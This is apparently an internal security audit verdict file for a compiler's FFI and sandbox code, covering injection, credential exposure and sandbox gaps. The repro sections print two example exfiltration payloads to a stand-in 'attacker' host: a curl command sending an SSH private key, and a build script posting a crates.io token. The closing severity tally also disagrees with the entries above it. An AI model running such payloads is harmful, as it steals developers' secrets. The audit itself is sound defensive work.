# ffi-security verdicts

Theme covers `co-ffi.md` (1 crit, 1 high, 2 med) + the FFI/sandbox subset of
`cli.md` (CLI-001 high, CLI-002/003 med, CLI-007/008 low security items). Every
verdict below was reached by tracing the cited `file:line` in
`src/compiler/sandbox/src/lib.rs`, `src/compiler/ffi/src/*`, and
`src/ipe-cli/src/ffi.rs`/`lib.rs`. Line numbers in the findings drifted from the
current tree; I re-anchored each claim to the live code.

## co-ffi-001 · CONFIRMED
- final severity: **critical**
- reachability: two attacker capabilities, both real.
  (a) **Corrupted/planted cache (warm build)** — `load_catalog` (driver.rs:524)
  reads `<slug>_bindings.rs` verbatim off disk (driver.rs:553) and only
  substring-checks that each `wrapperIdent` appears as `pub fn <ident>(`
  (driver.rs:598-607). It NEVER re-parses the Call AST / type-refs. A hand-edited
  `_bindings.rs` (or one planted via CLI-002's ancestor-cache walk) with injected
  Rust inside a reached wrapper region is compiled unsandboxed at `ipe build`.
  (b) **Malicious inspector output / crate (fresh install)** — even the fresh
  decode path validates only IDENTIFIER fields, not type strings. In
  `pkginfo.rs`, `name`/`method_name`→`RustIdent::parse` (600,602),
  `call_path`→`IdentPath::parse` (605), `dep.ident`→`RustIdent::parse` (667), but
  `Param.rust_type` (588) and `recv_rust_type` (629) are stored raw — the doc
  comment even says "verbatim from the inspector" (pkginfo.rs:216,222). In
  `typeref.rs`, `WireTypeRef::Prim(String)`/`Ctor(String,..)` convert to
  `InnerTypeRef` (228-245) with no charset gate; `render` emits `p.clone()` /
  `format!("{nm}<...>")` verbatim (283-289) — a test even accepts
  `::std::string::String` as a ctor name (422). In `call.rs`, `Call.path:
  Vec<String>`, `method: Option<String>`, `trait_qualifier: Option<(String,
  String)>` (105-117) are stored raw; `decode` (131) validates only STRUCTURE
  (arg indices, arity, closure placement), never identifier content;
  `render_body` emits `self.path.join("::")` (406) and `<{self_path} as
  {trait_path}>::{m}` (447) verbatim. Enum `struct_fields`/`selector`/`EnumArm`
  `pattern`+`tag` are raw `String` (pkginfo.rs:159-202) routed only through
  `rust_safe_ident` (bindings.rs:1203,1283), which keyword-escapes but does NOT
  reject injection charsets.
- reasoning: the tainted strings reach an UNSANDBOXED compile. `assemble_emit`
  (ffi.rs:93) concatenates each crate's `bindings_source` into one blob; the
  backend writes it to the emitted project's `src/ffi.rs` and adds `mod ffi;` to
  `main.rs` (backend/rust/src/project.rs:1240-1248); `cargo build` then compiles
  it as part of the user crate with NO jail (the bwrap jail wraps only the
  `ipe add` inspector, never `ipe build`). The sentinel DCE
  (`shake_ffi_by_fn_ident`) keeps a wrapper region iff its `pub fn` ident is
  reached — injected tokens live INSIDE a reached region's signature/body, so DCE
  keeps them. `naming.rs:14`'s invariant ("a crate that names a symbol `;
  std::process::Command::new(...)` can never reach generated source") holds ONLY
  for the `RustIdent`-gated names; it is false for the type/path/field surface.
  The value type is `String` where the parse-don't-validate rule demands a
  validated `RustIdent`/`IdentPath` newtype, so an injection-bearing state is
  representable past decode.
- repro (code injection, warm-cache path — the lowest-capability trigger): given
  a project whose ancestor dir holds `.ipe/cache/ffi/rust/x.consumer.json` +
  `x.interface` + `x_bindings.rs` where `x_bindings.rs` contains a reached
  wrapper region whose body is
  `pub fn x_go() -> String { std::process::Command::new("sh").arg("-c").arg("curl attacker/$(cat ~/.ssh/id_rsa|base64)").status(); String::new() }`
  and the interface forwards to `x_go` — `load_catalog`'s only check
  (`bindings_source.contains("pub fn x_go(")`) passes, and `ipe run` compiles +
  executes it. SEAL corollary: a `rustType` with unbalanced `<`/`>` yields `ipe`
  exit-0 (load_catalog checks only substring existence, never Rust validity) then
  a `cargo build` failure.
- dup-of: — (network-posture symptom shared with co-ffi-004/CLI-001; this is a
  distinct root cause = unvalidated identifier/type strings past the decode gate).

## co-ffi-002 · CONFIRMED
- final severity: medium
- reachability: `ipe add <malicious-crate>` on a host where `bwrap` exists but
  `timeout`/`prlimit` are absent from PATH.
- reasoning: `probe()` (lib.rs:136) returns `None` for absent helpers;
  `bwrap_argv` wraps caps in `if let Some(t)=timeout` (266) / `if let Some(p)=prlimit`
  (346), silently omitting the wall-clock and every rlimit — no warning, no
  refusal. `ffi.rs:179` gates only on `Mechanism::Bwrap`, not on cap
  availability, so the run proceeds uncapped. Separately `run_in_bwrap_jail`
  drains stdout to completion (517), THEN stderr (518), THEN waits (519) — a
  payload that fills the stderr pipe then spins deadlocks the reader, and the
  only backstop is the possibly-absent `timeout`. Real but requires a
  partially-provisioned host; correctly rated medium.
- dup-of: —

## co-ffi-003 · CONFIRMED
- final severity: medium
- reachability: `ipe add` on a host without `bwrap` but with `unshare`
  (common on hardened/CI kernels that disable unprivileged user namespaces bwrap
  needs).
- reasoning: `select_mechanism` returns `UnshareCandidate` (lib.rs:171), but the
  sole consumer `ffi.rs:179` only spawns for `Mechanism::Bwrap`; the
  `UnshareCandidate` arm is never wired to `prove_isolation` (lib.rs:408, invoked
  only by unit tests). So an unshare-only host either refuses or, under
  `IPE_FFI_ALLOW_UNSANDBOXED=1`, runs the inspector with ZERO isolation
  (ffi.rs:244) — strictly less safe than the proven-namespace tier the module doc
  (lib.rs:11) advertises. Advertised-but-dead capability; correctly medium
  (completeness / secure-default).
- dup-of: —

## co-ffi-004 · CONFIRMED (DUP root with CLI-001)
- final severity: medium
- reachability: `ipe add <malicious-crate>` — the single integrated invocation
  runs `NetworkPolicy::FetchOnly` (ffi.rs:220), i.e. network ON, while rustdoc
  expands the crate's proc-macros (always) and build scripts (with
  `--allow-build-scripts`).
- reasoning: the sandbox crate ships `NetworkPolicy::Denied` + a `registry_cache`
  field (lib.rs:189,235) precisely to split an egress-enabled FETCH from an
  egress-denied COMPILE, so foreign code never runs while the network is
  reachable. The consumer collapses both into one `FetchOnly` phase and passes
  `registry_cache: None` (ffi.rs:224), so untrusted proc-macro/build-script code
  executes with full outbound egress (SSRF/exfil surface). Real; medium is right
  (the two-phase posture exists and is simply unused).
- dup-of: shares its network-on ROOT with CLI-001 — same single `FetchOnly`
  phase. Register as ONE root cause "untrusted code executes with egress on
  during `ipe add`" with two symptoms: (co-ffi-004) no confined-compile phase,
  (CLI-001) a specific secret readable during that phase. Keep both listed; the
  fix (two-phase fetch/compile split) closes co-ffi-004 and is a defense-in-depth
  half of CLI-001.

## CLI-001 · CONFIRMED
- final severity: **high**
- reachability: `ipe add <crate>` / `ipe install` on any machine where
  `~/.cargo/credentials.toml` (or `credentials`) exists (i.e. the user ran
  `cargo login`). The inspected crate is an arbitrary attacker-published
  crates.io package; untrusted code runs inside the jail (proc-macros always;
  build scripts under `--allow-build-scripts`).
- reasoning: `run_inspector` pushes the WHOLE `home.join(".cargo")` into
  `toolchain_ro_binds` (ffi.rs:211). `bwrap_argv` masks home with `--tmpfs /home`
  (lib.rs:294) but then re-binds every `toolchain_ro_binds` dir `--ro-bind <dir>
  <dir>` at its absolute path AFTER the mask (lib.rs:304-308) — so
  `~/.cargo/credentials.toml` is READABLE inside the jail at its well-known path.
  Nothing masks the credentials file. The phase is `FetchOnly` (network on), so
  jailed untrusted code reads the crates.io API token and POSTs it out — defeating
  the confidentiality half of the jail's own boundary. The finding correctly
  notes `CARGO_HOME` being redirected to the scoped tmp (lib.rs:327) protects
  cargo's own credential LOOKUP but not the file's readability at
  `~/.cargo/`. Confirmed at high.
- repro (exfil): publish crate `evil` whose `build.rs` (invoked when the victim
  runs `ipe add evil --allow-build-scripts`; without the flag a proc-macro in a
  `#[derive]` rustdoc-expands during inspection) does
  `let t = std::fs::read_to_string(format!("{}/.cargo/credentials.toml", env!("HOME_REAL")))` —
  HOME is tmpfs-masked so it reads the literal absolute path
  `/home/<user>/.cargo/credentials.toml` (still ro-bound) — then
  `ureq::post("https://attacker/steal").send_string(&t)` over the open fetch
  network.
- dup-of: shares the network-on root with co-ffi-004 (see that entry). Distinct
  symptom = a specific high-value secret is readable; keep as its own high.

## CLI-002 · CONFIRMED
- final severity: medium
- reachability: `ipe build`/`ipe run` of a project under an attacker-writable
  ancestor (e.g. a checkout in `/tmp/<x>` on a multi-user host, with a
  pre-planted `/tmp/.ipe/cache/ffi/rust`).
- reasoning: `find_cache_root` (ffi.rs:26-40) walks UP to the filesystem root and
  returns the FIRST `.ipe/cache/ffi/rust` hit — no stop at `ipe.toml`, no
  ownership check. `load_catalog_for` then loads that catalog and
  `assemble_emit` splices its `bindings_source` verbatim into the emitted
  `src/ffi.rs`, which `ipe run` compiles + executes. Directory position alone
  (no user action on the planted files) expands the trusted-code set. This is the
  concrete delivery vector for co-ffi-001(a). Correctly medium.
- dup-of: — (feeds co-ffi-001's warm-cache path; independent root = unbounded
  upward cache discovery).

## CLI-003 · REFUTED (out of theme — correctness, not ffi-security)
- final severity: —
- reasoning: wasm×static composition gate; no FFI/sandbox/secret surface. Left to
  the correctness partition's judge. Not evaluated here beyond confirming it is
  not a security item.
- dup-of: —

## CLI-007 · CONFIRMED
- final severity: low
- reachability: `ipe install` (no flags) in a freshly-cloned untrusted project
  with `[rust.dependencies]`.
- reasoning: `run_install` sets `assume_yes = matches!(rest,[flag] if
  flag=="--yes") || rest.is_empty()` (ffi.rs:362) — bare `ipe install` takes the
  yes path and inspects every manifest-listed crate with no trust prompt, while
  `ipe add` prints the trust summary and requires confirmation (ffi.rs:325-333).
  A consent gate present on one path is bypassed by default on the sibling. The
  `[--yes]` usage string implies interactive-by-default, contradicting the
  behaviour. Real, but each inspection still runs inside the jail — the exposure
  is bounded by whatever the jail leaks (i.e. it amplifies CLI-001/co-ffi-004
  rather than adding a new escape). Correctly low.
- dup-of: —

## CLI-008 · CONFIRMED
- final severity: low
- reachability: every sandboxed `ipe add`/`ipe install` on a multi-user host.
- reasoning: the writable jail scratch root is
  `temp_dir().join("ipe-ffi-add-{crate}-{pid}")` created with `create_dir_all`
  (ffi.rs:192-197) — a predictable name in world-writable `/tmp` that
  `create_dir_all` accepts pre-existing (incl. a planted symlink-to-dir), then
  bind-mounted RW into the jail (ffi.rs:219-229 → lib.rs:309). A local attacker
  winning the name race redirects the jailed inspection's writes. Independently it
  violates the repo write-boundary rule ("scratch state never in `/tmp`, under
  `~/.cache/ipe/` only"). The pid suffix narrows but does not close the race.
  Correctly low.
- dup-of: —

---

Confirmed: 8 (1 crit / 2 high / 3 med / 2 low) · Refuted: 1 · Downgraded: 0 · Dup: 1 (co-ffi-004 DUP-root with CLI-001)

PUSH-BLOCKING: **co-ffi-001 (critical)** — unvalidated type/path/field strings
reach an unsandboxed compile = code injection into the user's build/run. Warm-cache
delivery via CLI-002 needs no crate publish, only a writable ancestor dir.
**CLI-001 (high)** — crates.io token exfil on any `cargo login`'d dev box doing
`ipe add`. Both should block the push; co-ffi-004 is the shared network-posture
fix that also hardens CLI-001.
